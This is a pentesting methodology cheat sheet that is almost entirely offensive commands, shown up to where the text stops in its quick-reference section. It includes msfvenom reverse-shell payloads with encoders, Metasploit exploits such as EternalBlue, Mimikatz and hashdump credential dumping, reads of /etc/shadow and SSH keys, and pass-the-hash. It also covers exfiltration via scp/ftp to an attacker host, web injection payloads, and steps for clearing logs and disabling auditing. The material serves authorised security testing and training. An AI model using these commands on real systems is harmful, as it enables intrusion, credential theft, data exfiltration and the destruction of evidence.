# 📔 Complete Penetration Testing Methodology Cheat Sheet

## Table of Contents

1. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
2. [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
3. [Phase 3: Vulnerability Assessment](#phase-3-vulnerability-assessment)
4. [Phase 4: Exploitation](#phase-4-exploitation)
5. [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
6. [Phase 6: Privilege Escalation](#phase-6-privilege-escalation)
7. [Phase 7: Lateral Movement](#phase-7-lateral-movement)
8. [Phase 8: Data Exfiltration & Cleanup](#phase-8-data-exfiltration--cleanup)
9. [Phase 9: Reporting](#phase-9-reporting)
10. [Quick Reference Commands](#quick-reference-commands)

---

## PHASE 1: RECONNAISSANCE

### 1.1 Passive Information Gathering

#### Domain Information

```bash
# WHOIS Lookup
whois <TARGET_DOMAIN>
whois <TARGET_IP>

# DNS Records
host <TARGET_DOMAIN>
dig <TARGET_DOMAIN>
dig <TARGET_DOMAIN> +short
dig <TARGET_DOMAIN> MX
dig <TARGET_DOMAIN> NS
dig <TARGET_DOMAIN> TXT

# DNS Reverse Lookup
dig -x <TARGET_IP>
nslookup <TARGET_IP>

# DNS Zone Transfer
dig axfr @<DNS_SERVER> <TARGET_DOMAIN>
dnsenum <TARGET_DOMAIN>
```

#### Email & Personnel Discovery

```bash
# Email harvesting
theHarvester -d <TARGET_DOMAIN> -b all
theHarvester -d <TARGET_DOMAIN> -b google,linkedin,twitter

# Person Information
hunter.io (online tool)
rocketreach.co
linkedin.com (manual search)

# Subdomain Enumeration
sublist3r -d <TARGET_DOMAIN>
assetfinder --subs-only <TARGET_DOMAIN>
amass enum -d <TARGET_DOMAIN>
```

#### Website Analysis

```bash
# WHOIS Registrant
whois <TARGET_DOMAIN>

# Website Technology Stack
whatweb <TARGET_DOMAIN>
wappalyzer (browser extension)
builtwith.com (online tool)

# SSL/TLS Certificate Info
openssl s_client -connect <TARGET>:443
sslscan <TARGET>
certspotter.com (online tool)

# Website Crawling
wget -r --spider http://<TARGET>
curl -s http://<TARGET> | grep href

# Wayback Machine
wayback -d <TARGET_DOMAIN>
site:web.archive.org/<TARGET_DOMAIN>

# DNS Subdomain Discovery
crt.sh (online tool - certificate logs)
```

#### Google Dorks

```
site:target.com
site:target.com filetype:pdf
site:target.com "admin"
site:target.com "login"
site:target.com inurl:wp-admin
site:target.com inurl:phpmyadmin
inurl:"/upload/" "target.com"
intitle:"index of" site:target.com
cache:target.com
inurl:backup site:target.com
inurl:config site:target.com
filetype:sql OR filetype:db site:target.com
```

#### Social Engineering

```bash
# OSINT Framework
osintframework.com
maltego (tool)

# Social Media
- LinkedIn (company info, employees)
- Twitter
- Facebook
- GitHub (code leaks, employee accounts)
- Instagram

# Phone Numbers
- Target website
- Employee LinkedIn profiles
- Business directories
```

#### Network Intelligence

```bash
# IP Geolocation
geoiplookup <TARGET_IP>
maxmind.com

# ASN Information
asnlookup.com <TARGET_IP>
whois -h whois.cymru.com <TARGET_IP>

# Netblock Information
whois -c <NETBLOCK>
```

### 1.2 Active Information Gathering

#### Network Mapping

```bash
# Ping
ping <TARGET_IP>
ping <TARGET_DOMAIN>

# Traceroute
traceroute <TARGET_IP>
tracert <TARGET_IP>          # Windows
mtr <TARGET_IP>              # Interactive

# Network Path Analysis
path-ping <TARGET_IP>
```

#### DNS Enumeration

```bash
# DNS Brute Force
dnsenum <TARGET_DOMAIN>
fierce --domain <TARGET_DOMAIN>

# Subdomain Brute Force
ffuf -w wordlist.txt -u http://FUZZ.<TARGET_DOMAIN>
gobuster dns -d <TARGET_DOMAIN> -w wordlist.txt

# Reverse DNS
dnsrecon -d <TARGET_DOMAIN> -t reverse -r <CIDR_RANGE>
```

---

## PHASE 2: SCANNING & ENUMERATION

### 2.1 Network Scanning

#### NMAP Scanning

```bash
# Basic Host Discovery
nmap <TARGET_IP>
nmap -sn <TARGET_RANGE>              # Ping Sweep
netdiscover -r <TARGET_RANGE>        # ARP Scan

# Port Scanning Techniques
nmap -sS <TARGET_IP>                 # SYN Scan (Stealth)
nmap -sT <TARGET_IP>                 # TCP Connect
nmap -sU <TARGET_IP>                 # UDP Scan
nmap -sN <TARGET_IP>                 # NULL Scan
nmap -sF <TARGET_IP>                 # FIN Scan
nmap -sX <TARGET_IP>                 # Xmas Scan
nmap -sM <TARGET_IP>                 # Maimon Scan
nmap -sA <TARGET_IP>                 # ACK Scan

# Port Range Scanning
nmap -p- <TARGET_IP>                 # All Ports
nmap -p 1-1000 <TARGET_IP>           # Range
nmap -p 22,80,443,3306 <TARGET_IP>   # Specific Ports
nmap -p U:53,111,137,T:21-25,80,139,8080 <TARGET_IP>  # Mixed

# Service & OS Detection
nmap -sV <TARGET_IP>                 # Service Version
nmap -O <TARGET_IP>                  # OS Detection
nmap -A <TARGET_IP>                  # Aggressive (sV + O + scripts)

# Timing & Performance
nmap -T3 <TARGET_IP>                 # T0-T5 (slow to insane)
nmap -n <TARGET_IP>                  # No DNS resolution
nmap --min-rate=1000 <TARGET_IP>     # Min packets/second

# Script Scanning
nmap --script vuln <TARGET_IP>
nmap --script=smb-* <TARGET_IP>
nmap -sC <TARGET_IP>                 # Default scripts

# Output Formats
nmap -oN output.txt <TARGET_IP>      # Normal
nmap -oX output.xml <TARGET_IP>      # XML
nmap -oG output.grep <TARGET_IP>     # Grepable
nmap -oA output <TARGET_IP>          # All formats

# Firewall Evasion
nmap -f <TARGET_IP>                  # Fragment packets
nmap --mtu 16 <TARGET_IP>            # MTU Fragmentation
nmap -D decoy1,decoy2,ME <TARGET_IP> # Decoy scanning
nmap --source-port 53 <TARGET_IP>    # Source port spoofing
nmap -e <INTERFACE> <TARGET_IP>      # Interface specification
```

#### Advanced Scanning

```bash
# Masscan (faster than nmap)
masscan <TARGET_RANGE> -p0-65535 --rate=1000 -oL output.txt

# Zmap
zmap -p 80 <TARGET_RANGE> -o output.txt

# Nessus/OpenVAS
nessus (commercial)
openvas (free)
```

### 2.2 Service Enumeration

#### SMB/NetBIOS

```bash
# SMB Enumeration
nmap -p 445 --script smb-* <TARGET_IP>
nmblookup -A <TARGET_IP>
smbclient -L <TARGET_IP> -N
smbmap -u guest -p "" -H <TARGET_IP>
enum4linux -a <TARGET_IP>
crackmapexec smb <TARGET_IP> --shares

# Metasploit
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/pipe_auditor

set RHOSTS <TARGET_IP>
run
```

#### FTP

```bash
# FTP Enumeration
nmap -p 21 -sV <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
ftp <TARGET_IP>

# Commands
ls
cd
get
put
ascii
binary
```

#### SSH

```bash
# SSH Enumeration
nmap -p 22 -sV <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey <TARGET_IP>

# Banner Grabbing
nc -vv <TARGET_IP> 22
ssh -v <TARGET_IP>

# SSH Brute Force
hydra -l <USER> -P wordlist.txt ssh://<TARGET_IP>
medusa -h <TARGET_IP> -u <USER> -P wordlist.txt -M ssh
```

#### HTTP/HTTPS

```bash
# HTTP Enumeration
nmap -p 80 -sV <TARGET_IP>
nmap -p 80 --script http-enum <TARGET_IP>
nmap -p 80 --script http-methods <TARGET_IP>
nmap -p 80 --script http-headers <TARGET_IP>

# Directory Scanning
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP> -w wordlist.txt
ffuf -w wordlist.txt -u http://<TARGET_IP>/FUZZ
dirsearch -u http://<TARGET_IP> -w wordlist.txt

# HTTP Methods
curl -X OPTIONS http://<TARGET_IP> -v
curl -X TRACE http://<TARGET_IP> -v
curl -X DELETE http://<TARGET_IP>/file -v

# Website Technology
whatweb <TARGET_IP>
wappalyzer (browser extension)
nikto -h http://<TARGET_IP>

# Burp Suite
burpsuite (web proxy/scanner)
```

#### DNS

```bash
# DNS Enumeration
dig <TARGET_DOMAIN>
dig <TARGET_DOMAIN> @<DNS_SERVER>
nslookup <TARGET_DOMAIN>

# DNS Brute Force
ffuf -w wordlist.txt -u http://FUZZ.<TARGET_DOMAIN>:80 -fl 20
dnsenum <TARGET_DOMAIN>

# Zone Transfer
dig axfr @<DNS_SERVER> <TARGET_DOMAIN>
```

#### SMTP

```bash
# SMTP Enumeration
nmap -p 25 -sV <TARGET_IP>
nc <TARGET_IP> 25
telnet <TARGET_IP> 25

# User Enumeration
smtp-user-enum -U users.txt -t <TARGET_IP>

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
```

#### MySQL

```bash
# MySQL Enumeration
nmap -p 3306 -sV <TARGET_IP>
nmap -p 3306 --script mysql-info <TARGET_IP>
nmap -p 3306 --script mysql-users <TARGET_IP>

# Direct Connection
mysql -h <TARGET_IP> -u root
mysql -h <TARGET_IP> -u root -p

# Commands
show databases;
use <database>;
show tables;
select * from <table>;
```

#### RDP

```bash
# RDP Enumeration
nmap -p 3389 -sV <TARGET_IP>
nmap -p 3389 --script rdp-enum-encryption <TARGET_IP>

# RDP Client
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>:3389
rdesktop -u <USER> -p <PASS> <TARGET_IP>
```

#### LDAP

```bash
# LDAP Enumeration
ldapsearch -h <TARGET_IP> -x -s base namingcontexts
ldapsearch -h <TARGET_IP> -x -b "dc=target,dc=com" "*"
nmap -p 389 --script ldap-search <TARGET_IP>
```

---

## PHASE 3: VULNERABILITY ASSESSMENT

### 3.1 Vulnerability Scanning

#### Automated Scanning

```bash
# Nessus
nessus (commercial, most popular)
- Create policy
- Scan target
- Analyze results
- Generate report

# OpenVAS
openvas (free alternative)

# Metasploit Scanning
msfconsole
db_nmap -sS -sV -O <TARGET_IP>
vulns                    # List vulnerabilities
search cve:2024
```

#### Manual Testing

```bash
# Nmap Vuln Scripts
nmap --script vuln <TARGET_IP>
nmap --script smb-vuln-* <TARGET_IP>
nmap -p 3306 --script mysql-audit <TARGET_IP>

# Searchsploit
searchsploit <SERVICE> <VERSION>
searchsploit -m <EXPLOIT_ID>
searchsploit -u              # Update database
```

### 3.2 Exploitation Research

```bash
# Vulnerability Databases
- CVE Database (cve.mitre.org)
- NVD (nvd.nist.gov)
- ExploitDB (exploit-db.com)
- SearchSploit (command line)
- Metasploit (msfdb)

# Vulnerability Analysis
search <CVE_ID>
show info
show targets
show payloads
show options
```

---

## PHASE 4: EXPLOITATION

### 4.1 Payload Generation

#### MSFVenom

```bash
# Generate Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell64.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell64.elf

# Web Payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p aspx/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx

# Encoders
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=<IP> LPORT=<PORT> -f exe > encoded.exe

# Format Options
-f exe, -f elf, -f raw, -f php, -f asp, -f aspx, -f jsp, -f war, -f py, -f sh, -f bash
```

### 4.2 Exploitation Methods

#### Windows Exploitation

```bash
# IIS WebDAV
davtest -url http://<TARGET>
davtest -auth user:pass -url http://<TARGET>/webdav
cadaver http://<TARGET>/webdav

# SMB/EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
use exploit/windows/smb/ms17_010_eternalblue

# RDP BlueKeep
nmap -p 3389 --script rdp-enum-encryption <TARGET_IP>
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# IIS Exploitation
use exploit/multi/http/iis_put_upload_exec

# Privilege Escalation
use exploit/windows/local/bypassuac_injection
use exploit/windows/local/ms15_051_client_copy_image

set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT <PORT>
exploit
```

#### Linux Exploitation

```bash
# CGI Script Execution
nmap -p 80 --script http-shellshock <TARGET_IP>
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# FTP Service
searchsploit vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

# SAMBA
searchsploit samba
use exploit/linux/samba/is_known_pipename

# SSH
hydra -l user -P wordlist.txt ssh://<TARGET_IP>
use exploit/unix/ssh/libssh_auth_bypass

# Kernel Exploits
./linux-exploit-suggester.sh
searchsploit kernel <VERSION>

set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT <PORT>
exploit
```

#### Web Application Exploitation

```bash
# SQL Injection
sqlmap -u "http://<TARGET>/page.php?id=1" --dbs
sqlmap -u "http://<TARGET>/page.php?id=1" -D database --tables
sqlmap -r request.txt -p parameter --os-shell

# XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# File Upload
upload shell.php to /uploads/
access via http://<TARGET>/uploads/shell.php

# Local File Inclusion
http://<TARGET>/page.php?file=../../../../etc/passwd

# Remote Code Execution
# Test with system command injection
; whoami
| whoami
|| whoami

use exploit/multi/http/wordpress_plugin_upload_exec
use exploit/unix/webapp/xoda_file_upload
```

### 4.3 Metasploit Exploitation

```bash
# Start Metasploit
service postgresql start && msfconsole

# Database Setup
db_status
db_nmap -sS -sV <TARGET_IP>

# Workspace Management
workspace -a <NAME>
workspace <NAME>
workspace -d <NAME>

# Module Search & Use
search type:exploit <SERVICE>
use exploit/path/to/module

# Set Options
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT <PORT>
set PAYLOAD windows/meterpreter/reverse_tcp
set USERNAME <USER>
set PASSWORD <PASS>

# Execute
check                           # Check if vulnerable
exploit                         # Run exploit
run                            # Alternative to exploit

# Session Management
sessions -l                    # List sessions
sessions -i 1                  # Interact with session 1
sessions -u 1                  # Upgrade to Meterpreter
sessions -k 1                  # Kill session
sessions -c "command" -i 1     # Run command
```

---

## PHASE 5: POST-EXPLOITATION

### 5.1 Information Gathering (Post-Shell)

#### Windows Enumeration

```bash
# Meterpreter
sysinfo
getuid
getprivs
getsystem
getenv

# Windows CMD (via shell)
whoami
whoami /priv
whoami /all
systeminfo
ipconfig /all
ipconfig /all /all
route print
arp -a
netstat -ano
netstat -ano | findstr LISTENING
tasklist /v
tasklist /svc
Get-Process (PowerShell)
Get-Service (PowerShell)

# User Enumeration
net user
net user /domain
net localgroup
net localgroup administrators
query user
Get-LocalUser (PowerShell)

# Network Enumeration
ipconfig
route print
arp -a
netstat -ano
Get-NetTCPConnection (PowerShell)

# File System
dir /s /b
tree
cd
type <FILE>
attrib <FILE>

# Registry
reg query HKLM
reg query HKCU
Get-ItemProperty (PowerShell)

# Network Shares
net share
net use
smbmap

# Firewall
netsh advfirewall show allprofiles
Get-NetFirewallProfile (PowerShell)

# Antivirus/Security
wmic product list
Get-MpPreference (PowerShell)
Get-MpComputerStatus (PowerShell)

# Scheduled Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask (PowerShell)

# Event Logs
Get-EventLog -LogName Security -Newest 10 (PowerShell)
wmic logicaldisk get name

# Patches/Updates
wmic qfe
Get-HotFix (PowerShell)

# Domain Enumeration
wmic computersystem get domain
Get-ADUser (PowerShell - needs AD PS module)
dsquery user
```

#### Linux Enumeration

```bash
# User Information
whoami
id
groups
sudo -l
groups <USER>

# System Information
uname -a
uname -r
cat /etc/issue
cat /etc/*release
lsb_release -a
hostnamectl
uptime

# Network
ifconfig
ip a
ip -br -c a
hostname
cat /etc/hosts
cat /etc/networks
netstat -antp
ss -antp
ip route
route

# File System
pwd
ls -la
find / -type f -perm -4000    # SUID files
find / -type f -perm -2000    # SGID files
find / -type f -writable      # Writable files
df -h
du -sh *
mount

# Process Information
ps aux
ps aux | grep <SERVICE>
pgrep <PROCESS>

# Services
systemctl list-units --type=service
service --status-all
cat /etc/crontab
crontab -l
cat /etc/cron.d/*
cat /etc/cron.daily/*

# SSH Keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa

# Environment
env
echo $PATH
echo $HOME

# User Information
cat /etc/passwd
cat /etc/shadow (root only)
cat /etc/group
lastlog
w
who
last

# Package Management
apt list --installed (Debian)
rpm -qa (RedHat)
yum list installed
pacman -Q

# Installed Software
which <COMMAND>
locate <FILE>
find / -name <FILE>

# Logs
tail -f /var/log/auth.log
tail -f /var/log/syslog
tail -f /var/log/apache2/access.log
```

### 5.2 Credential Harvesting

#### Windows

```bash
# Meterpreter
hashdump                           # SAM dump
load kiwi                          # Load Mimikatz module
creds_all                          # Dump all credentials
lsa_dump_sam                       # LSA dump
lsa_dump_secrets                   # LSA secrets

# Mimikatz
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

# cmdkey (Stored Credentials)
cmdkey /list

# Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Linux

```bash
# /etc/passwd & /etc/shadow
cat /etc/passwd
sudo cat /etc/shadow

# Metasploit
use post/linux/gather/hashdump
use post/linux/gather/enum_users_history

# SSH Keys
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Bash History
cat ~/.bash_history
cat /root/.bash_history

# Password Files
cat ~/.pgpass
cat ~/.mysql_history
```

### 5.3 System Reconnaissance

```bash
# Running Services/Applications
netstat -antp              # Linux - open ports
netstat -ano               # Windows - open ports
ss -antp                   # Linux - modern
lsof -i                    # Linux - open connections

# Installed Applications
wmic product list          # Windows
apt list --installed       # Linux (Debian)
rpm -qa                    # Linux (RedHat)

# Auto-starting Services
Get-Service | Where {$_.StartType -eq "Automatic"}  # Windows PS
systemctl list-units --type=service                 # Linux

# Scheduled Tasks
schtasks /query /fo LIST /v    # Windows
crontab -l                     # Linux (current user)
cat /etc/crontab               # Linux (system)

# Network Configuration
ipconfig /all               # Windows
ip a                       # Linux
netstat -an               # Both
route print               # Windows
route -n                  # Linux
```

---

## PHASE 6: PRIVILEGE ESCALATION

### 6.1 Windows Privilege Escalation

#### Information Gathering

```bash
# Check Current Privileges
whoami /priv
whoami /all
Get-CurrentUser (PowerShell)

# Check if Admin
net localgroup administrators
Get-LocalGroupMember -Group "Administrators" (PowerShell)

# Windows Version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
[System.Environment]::OSVersion (PowerShell)

# Patches & Hotfixes
wmic qfe list
Get-HotFix (PowerShell)

# Services Running as Admin
tasklist /v
Get-Process

# File Permissions
icacls <PATH>
Get-Acl <PATH> (PowerShell)

# Scheduled Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask (PowerShell)

# Startup Folders
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Registry Keys
reg query HKLM\Software\Microsoft\Windows\Run
reg query HKCU\Software\Microsoft\Windows\Run
```

#### Exploitation Methods

```bash
# UAC Bypass
use exploit/windows/local/bypassuac_injection
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_sdclt

# Kernel Exploits
use post/multi/recon/local_exploit_suggester
search platform:windows exploit
use exploit/windows/local/ms14_058_track_popup_menu
use exploit/windows/local/ms15_051_client_copy_image

# Token Impersonation
load incognito
list_tokens -u
impersonate_token "DOMAIN\Administrator"

# Service Exploitation
# Check if service is writable
icacls "C:\Program Files\Service\service.exe"
# Replace with malicious executable
# Service will run as SYSTEM

# DLL Injection
# Create malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > malicious.dll
# Inject via process

# RunAs
runas /user:Administrator cmd.exe

# Scheduled Task
schtasks /create /tn task /tr "C:\malware.exe" /sc onlogon /ru "SYSTEM"

# LSASS Process
migrateto lsass.exe (Meterpreter)
migrate <LSASS_PID>
```

### 6.2 Linux Privilege Escalation

#### Information Gathering

```bash
# Current User & Groups
whoami
id
groups
sudo -l                    # Sudo permissions

# Check SUID/SGID Files
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID

# Writable Files/Directories
find / -type f -writable 2>/dev/null
find / -type d -writable 2>/dev/null

# Kernel Version
uname -r
uname -a

# Distribution
cat /etc/issue
cat /etc/*release

# Running Processes
ps aux
ps aux | grep root

# Cron Jobs
crontab -l
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*

# Services
systemctl list-units --type=service
service --status-all

# sudo Configuration
cat /etc/sudoers
cat /etc/sudoers.d/*

# SSH Configuration
cat /etc/ssh/sshd_config

# Installed Software
dpkg -l (Debian)
rpm -qa (RedHat)
pacman -Q (Arch)
```

#### Exploitation Methods

```bash
# Kernel Exploit
./linux-exploit-suggester.sh
searchsploit kernel <VERSION>
gcc -pthread kernel_exploit.c -o exploit
./exploit

# SUID Binary Exploitation
file <SUID_BINARY>
strings <SUID_BINARY>
# Look for unsafe library calls
# Try to exploit via PATH injection or buffer overflow

# Sudo Exploitation
sudo -l                    # Check what can be run
# If allowed: sudo /usr/bin/find -exec sh \;
# If allowed: sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'

# Cron Job Exploitation
cat /etc/crontab
# Check if scripts are writable
ls -la /path/to/script
# Replace with malicious script

# Library Injection
ldd /binary               # Check linked libraries
# Try LD_PRELOAD
LD_PRELOAD=./malicious.so /binary

# Environment Variable Exploitation
echo $PATH
# Prepend ./ to PATH
# Create program with same name in current directory

# Capability Exploitation
getcap -r /                # Check capabilities
getcap <BINARY>
# Exploit if binary has CAP_SYS_ADMIN, etc.

# Docker Escape (if running in container)
docker ps
mount | grep -i docker
# Try docker.sock exploitation

# SSH Key Hijacking
cat ~/.ssh/authorized_keys
# Add your public key if writable

# Configuration File Exploitation
cat /etc/mysql/my.cnf      # Check credentials
cat /etc/postgresql/postgresql.conf
cat ~/.bashrc
cat ~/.bash_profile
```

---

## PHASE 7: LATERAL MOVEMENT

### 7.1 Network Reconnaissance

#### Internal Network Discovery

```bash
# Current Network
ipconfig /all               # Windows
ip a                       # Linux
ifconfig                   # Both

# Network Routes
route print                # Windows
route -n                   # Linux
ip route                   # Linux

# ARP Table
arp -a                     # Windows
arp -n                     # Linux

# Network Shares
net view                   # Windows
smbmap -H <TARGET>        # Both

# Hosts File
type C:\Windows\System32\drivers\etc\hosts  # Windows
cat /etc/hosts                              # Linux

# DNS Servers
nslookup                   # Windows
cat /etc/resolv.conf       # Linux

# Network Connections
netstat -ano               # Windows
netstat -antp              # Linux
ss -antp                   # Linux
Get-NetTCPConnection       # Windows PS
```

#### Host Discovery

```bash
# Ping Sweep
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i > nul && echo 192.168.1.%i is alive

# ARP Scan
arp-scan -l                # Linux
arp-scan -I eth0 -r 192.168.1.0/24

# Nmap from Pivot
nmap -sn 10.0.0.0/24       # Ping sweep
nmap -p 445 10.0.0.0/24    # SMB scan
nmap -p 3389 10.0.0.0/24   # RDP scan
```

### 7.2 Lateral Movement Techniques

#### SMB/NetBIOS

```bash
# Enumerate Shares
smbclient -L <TARGET> -U <USER>
smbmap -u <USER> -p <PASS> -H <TARGET>
net view \\<TARGET>

# Connect to Share
smbclient \\\\<TARGET>\\<SHARE> -U <USER>

# Remote Code Execution
psexec.py <DOMAIN>/<USER>:<PASS>@<TARGET> cmd.exe
use exploit/windows/smb/psexec

# Pass the Hash
use exploit/windows/smb/psexec
set SMBPass <LM:NTLM_HASH>

crackmapexec smb <TARGET> -u Administrator -H "<HASH>" -x "command"
```

#### RDP

```bash
# Enumerate RDP
nmap -p 3389 -sV <TARGET>
nmap -p 3389 --script rdp-enum-encryption <TARGET>

# RDP Connection
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>:3389
rdesktop -u <USER> -p <PASS> <TARGET>
mstsc.exe                  # Windows

# RDP Brute Force
hydra -l <USER> -P wordlist.txt rdp://<TARGET>
```

#### WinRM

```bash
# Enumerate WinRM
nmap -p 5985,5986 -sV <TARGET>
netstat -ano | findstr 5985

# Evil-WinRM
evil-winrm -u <USER> -p <PASS> -i <TARGET>

# CrackMapExec
crackmapexec winrm <TARGET> -u <USER> -p <PASS>
crackmapexec winrm <TARGET> -u <USER> -p <PASS> -x "whoami"

# PowerShell Remoting
$cred = Get-Credential
Enter-PSSession -ComputerName <TARGET> -Credential $cred
```

#### SSH

```bash
# SSH Connection
ssh <USER>@<TARGET>
ssh -i <KEY_FILE> <USER>@<TARGET>

# SSH Key Hijacking
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# SSH Agent Exploitation
ssh-add
SSH_AUTH_SOCK environment variable
```

#### Port Forwarding

```bash
# Meterpreter Port Forwarding
portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
portfwd list
portfwd delete -l <LOCAL_PORT>

# SSH Local Port Forward
ssh -L <LOCAL_PORT>:<TARGET>:<TARGET_PORT> <USER>@<PROXY>

# SSH Remote Port Forward
ssh -R <LOCAL_PORT>:<TARGET>:<TARGET_PORT> <USER>@<PROXY>

# Windows Port Forward
netsh interface portproxy add v4tov4 listenport=<LOCAL> listenaddress=0.0.0.0 connectport=<REMOTE> connectaddress=<TARGET>
```

#### VPN/Network Pivoting

```bash
# Meterpreter Pivoting
run autoroute -s <SUBNET_RANGE>
run autoroute -p              # Show routes

use auxiliary/scanner/portscan/tcp
set RHOSTS <NEW_TARGET>
set PORTS 1-1000
run

# Socks4 Proxy
use auxiliary/server/socks4a
set SRVPORT 9050
run

# Then use proxychains
proxychains nmap -sV <NEW_TARGET>
```

---

## PHASE 8: DATA EXFILTRATION & CLEANUP

### 8.1 Data Exfiltration

#### Windows

```bash
# Identify Target Data
dir C:\Users\<USER>\Documents\
dir C:\Users\<USER>\Desktop\
type C:\Windows\System32\config\SAM
type C:\Windows\System32\config\SYSTEM

# Credential Dumping
hashdump                    # SAM/SYSTEM
sekurlsa::logonPasswords   # Mimikatz
lsadump::cache             # Cached credentials

# File Exfiltration
download C:\path\to\file local_path    # Meterpreter
scp <FILE> <USER>@<ATTACKER>:path     # SSH
ftp <ATTACKER>
put <FILE>

# Database Exfiltration
mysql -h <TARGET> -u root -p<PASS> -e "SELECT * FROM database.table;" > dump.sql
sqlmap -u "http://<TARGET>/page.php?id=1" --dump-all
```

#### Linux

```bash
# Identify Target Data
find / -name "*.sql" -o -name "*.db"
find / -user root -perm -4000           # SUID files
cat /etc/shadow
cat ~/.ssh/id_rsa

# Configuration Files
cat /etc/postgresql/postgresql.conf
cat ~/.mysql_history
cat ~/.bash_history

# Database Exfiltration
mysqldump -h <TARGET> -u root -p<PASS> --all-databases > dump.sql
pg_dump -h <TARGET> -U postgres database_name > dump.sql

# File Exfiltration
scp -r /path/to/data <USER>@<ATTACKER>:/path
tar czf data.tar.gz /path/to/data && scp data.tar.gz <USER>@<ATTACKER>:
```

### 8.2 Covering Tracks

#### Windows

```bash
# Clear Event Logs
wevtutil el
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Command History
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
history -c (PowerShell)
cls

# Remove Files
del /S /Q C:\Windows\Temp\*
dir /ad /s C:\Windows\Temp

# Disable Audit Policies
auditpol /set /category:* /success:disable /failure:disable

# Metasploit Cleanup
clearenv
```

#### Linux

```bash
# Clear Bash History
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.history
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/apache2/access.log

# Remove Files
rm -rf /tmp/malware
find /tmp -mtime -1 -delete

# Disable Logging
echo "" > /var/log/lastlog
echo "" > /var/log/wtmp
echo "" > /var/log/utmp

# Stop Services
service rsyslog stop
service auditd stop
```

---

## PHASE 9: REPORTING

### 9.1 Report Structure

#### Executive Summary
- Client Overview
- Assessment Scope
- Key Findings (High-level)
- Overall Risk Rating

#### Methodology
- Scope & Timeline
- Tools Used
- Testing Phases

#### Findings

**Format for Each Finding:**
```
Title: [Vulnerability Name]
Severity: Critical/High/Medium/Low/Info
CVSS Score: X.X

Description:
[Detailed explanation]

Impact:
[Business impact]

Proof of Concept:
[Screenshot/Command output]

Remediation:
[Steps to fix]

References:
[CVE, CWE, etc.]
```

#### Remediation Recommendations

**By Severity:**
- Critical Issues (Fix immediately)
- High Issues (Fix within 1-2 weeks)
- Medium Issues (Fix within 1-2 months)
- Low Issues (Fix within 3-6 months)

#### Appendices

- Tools & Techniques Used
- CVSS Severity Ratings
- Glossary of Terms
- Detailed Logs/Screenshots

### 9.2 Report Generation

```bash
# Metasploit Report
workspace <NAME>
db_export -f csv > report.csv
db_export -f xml > report.xml

# Nessus Report
# Generate from Nessus UI
# Export as PDF/HTML

# Custom Reporting
# Use template tools
# Document findings manually

# Screenshot Tools
screenshot (Meterpreter)
Print Screen (Manual)
gnome-screenshot (Linux)
```

---

## QUICK REFERENCE COMMANDS

### Reconnaissance

```bash
# Passive
whois <TARGET>
dig <TARGET>
theHarvester -d <TARGET> -b all
whatweb <TARGET>

# Active
nmap <TARGET>
nmap -sn <RANGE>
traceroute <TARGET>
```

### Scanning & Enumeration

```bash
# Full Scan
